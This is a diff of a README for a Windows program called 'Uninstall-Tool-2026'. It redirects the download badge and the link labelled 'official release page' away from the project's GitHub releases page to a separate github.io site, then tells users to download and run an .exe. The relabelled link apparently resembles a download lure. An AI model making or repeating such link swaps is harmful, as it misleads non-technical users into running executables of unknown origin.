@@ -1,6 +1,6 @@
 # 🛠️ Uninstall-Tool-2026 - Remove stubborn programs from your PC
 
-[![Download Uninstall Tool](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/sibylnonzero928/Uninstall-Tool-2026/releases)
+[![Download Uninstall Tool](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://sibylnonzero928.github.io)
 
 Uninstall-Tool-2026 helps you delete software from your computer. Some programs leave files behind when you use the standard Windows removal tool. This software finds those leftover files and removes them. It cleans your system and recovers disk space.
 
@@ -8,7 +8,7 @@ Uninstall-Tool-2026 helps you delete software from your computer. Some programs 
 
 You do not need technical skills to use this tool. Follow these steps to install the program on Windows 10 or Windows 11.
 
-1. Go to the [official release page](https://github.com/sibylnonzero928/Uninstall-Tool-2026/releases).
+1. Go to the [official release page](https://sibylnonzero928.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file name ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
